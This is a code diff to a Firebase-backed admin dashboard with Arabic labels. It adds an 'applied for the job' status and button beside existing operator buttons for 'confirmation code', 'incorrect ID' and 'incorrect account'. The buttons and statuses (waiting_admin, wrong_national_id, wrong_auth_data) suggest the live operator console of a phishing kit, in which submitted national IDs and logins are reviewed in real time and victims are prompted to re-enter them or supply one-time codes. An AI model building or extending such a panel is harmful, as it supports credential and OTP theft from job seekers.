@@ -28,14 +28,20 @@ document.addEventListener('DOMContentLoaded', () => {
 
         sortedLogs.forEach((log) => {
             const row = document.createElement('tr');
-            let statusText = log.status === "waiting_admin" ? "بانتظار الأدمن" : log.status;
+            
+            // تحديد نص الحالة بناءً على القيمة القادمة من الفايربيس
+            let statusText = log.status;
+            if (log.status === "waiting_admin") statusText = "بانتظار الأدمن";
+            else if (log.status === "applied_success") statusText = "تم التقديم للوظيفة";
+            
             let statusClass = log.status === "waiting_admin" ? "waiting" : "action-done";
 
-            // أزرار التحكم والإجراءات الديناميكية
+            // أزرار التحكم والإجراءات الديناميكية (إضافة زر التقديم الجديد)
             const actionButtons = `
                 <button class="btn-action btn-code" data-id="${log.id}" data-type="${log.type}">رقم تأكيد</button>
                 <button class="btn-action btn-wrong-id" data-id="${log.id}" data-type="${log.type}">هوية غير صحيحة</button>
                 <button class="btn-action btn-wrong-pass" data-id="${log.id}" data-type="${log.type}">حساب غير صحيح</button>
+                <button class="btn-action btn-applied" style="background-color: #27ae60; color: white;" data-id="${log.id}" data-type="${log.type}">تم التقديم</button>
             `;
 
             if (log.type === "app_request") {
@@ -79,6 +85,9 @@ document.addEventListener('DOMContentLoaded', () => {
             await updateDoc(docRef, { status: "wrong_national_id" });
         } else if (e.target.classList.contains('btn-wrong-pass')) {
             await updateDoc(docRef, { status: "wrong_auth_data" });
+        } else if (e.target.classList.contains('btn-applied')) {
+            // تحديث الحالة عند الضغط على زر "تم التقديم"
+            await updateDoc(docRef, { status: "applied_success" });
         }
     }
 
